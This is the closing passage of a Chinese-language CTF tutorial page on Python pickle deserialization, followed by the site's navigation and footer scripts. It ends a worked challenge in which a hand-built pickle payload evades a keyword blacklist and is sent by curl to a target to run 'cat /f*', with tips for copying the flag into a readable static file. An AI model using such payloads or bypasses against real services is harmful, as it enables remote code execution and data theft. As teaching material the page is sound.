+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>             <span class="sa">b</span><span class="s1">'flag'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'subprocess'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'builtins'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'import'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'pickle'</span><span class="p">]:</span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>    <span class="k">assert</span> <span class="n">word</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">,</span> <span class="n">word</span>   <span class="c1"># 确认不撞黑名单</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div>
+<p>本地验证通过（执行 <code>cat /f*</code>，可用 <code>echo pwned</code> 之类的无害命令先测），且字节流中没有任何黑名单关键词。提交：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target:5000/pickle<span class="w"> </span>-d<span class="w"> </span><span class="s2">"data=&lt;上面输出的base64&gt;"</span>
+</code></pre></div>
+<p>页面返回 <code>pickle done</code>，说明命令已执行。本题没有回显，把 flag 带出来的常用办法是写进能访问到的文件再读，例如把命令换成 <code>cp /f* /app/static/x</code> 之类（具体路径看题目环境），或者用带外通道。</p>
+<p>回顾整条链路：找入口 → 试标准 <code>__reduce__</code> payload 撞黑名单 → 定位黑名单是字节匹配 → 用 <code>V</code> 转义 + 通配符手写 opcode 绕过。这也是大多数 pickle 题的通用节奏。</p>
+<h2 id="_8">小结<a class="headerlink" href="#_8" title="Permanent link">¶</a></h2>
+<ul>
+<li>pickle 反序列化 = 在栈式虚拟机上执行 opcode，<code>R</code> 指令可以直接发起函数调用，所以 <strong>不需要 POP 链</strong>，payload 自带 RCE 能力。</li>
+<li>平时用 <code>__reduce__</code> + <code>pickle.dumps()</code> 生成 payload；撞黑名单时手写 opcode，用 <code>pickletools.dis()</code> 调试。</li>
+<li>绕过的本质是"同一语义、不同字节"：换模块名、换协议写法、<code>\uXXXX</code> 转义、通配符。</li>
+<li>相关章节可交叉阅读：<a href="../php_unser/">PHP反序列化</a>（POP 链思路对照，章末另有 pickle 例题）、<a href="../rce/">RCE</a>（无回显时把结果带出来的方法）。</li>
+</ul></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../logical_vuln/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 逻辑漏洞"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        逻辑漏洞
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../py_sandbox/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: Python沙箱逃逸"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        Python沙箱逃逸
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#python">Python反序列化</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#php">从 PHP 反序列化迁移过来</a>
+        
+      </li>
+    
+      <li>
+        <a href="#pickle-opcode">pickle 协议与 opcode 极简入门</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_1">序列化结果长什么样</a>
+        
+      </li>
+    
+      <li>
+        <a href="#pickle">pickle 是一台栈式虚拟机</a>
+        
+      </li>
+    
+      <li>
+        <a href="#opcode">够用的 opcode 清单</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#__reduce__">__reduce__ 魔术方法</a>
+        
+      </li>
+    
+      <li>
+        <a href="#rce-payload">构造 RCE payload</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#os">用 os 执行命令</a>
+        
+      </li>
+    
+      <li>
+        <a href="#subprocess">用 subprocess 执行命令并拿到输出</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#opcode-pker">手写 opcode 与 pker</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">什么时候需要手写</a>
+        
+      </li>
+    
+      <li>
+        <a href="#pker">pker 工具</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_3">过滤绕过</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_4">黑名单挡的是"名字"，不是功能</a>
+        
+      </li>
+    
+      <li>
+        <a href="#sysmodules">sys.modules 被改掉</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">字符串编码绕过关键词匹配</a>
+        
+      </li>
+    
+      <li>
+        <a href="#restrictedunpickler">RestrictedUnpickler</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#ctf-pickle">CTF 例题：一道黑名单过滤的 pickle</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_6">分析</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">失败的尝试</a>
+        
+      </li>
+    
+      <li>
+        <a href="#opcode-unicode">解题：手写 opcode + unicode 转义</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_8">小结</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
